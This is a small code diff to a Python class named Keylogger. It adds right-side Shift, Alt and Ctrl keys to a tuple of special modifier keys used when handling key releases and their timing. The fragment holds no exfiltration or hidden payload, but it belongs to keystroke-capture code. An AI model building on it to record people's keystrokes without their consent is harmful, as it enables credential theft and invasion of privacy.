@@ -29,7 +29,7 @@ class Keylogger:
             return True
         release_time = time.time()
         # Special Case if key is shift
-        special_keys = ("KEY.SHIFT", "KEY.CTRL_L", "KEY.ALT_L", "KEY.ALT_GR")
+        special_keys = ("KEY.SHIFT", "KEY.CTRL_L", "KEY.ALT_L", "KEY.ALT_GR", "KEY.SHIFT_R", "KEY.ALT_R", "KEY.CTRL_R")
         if key_string in special_keys:
             for char in self.__pressed_keys:
                 if not char.replace('\'', '').isalpha() and char not in special_keys:
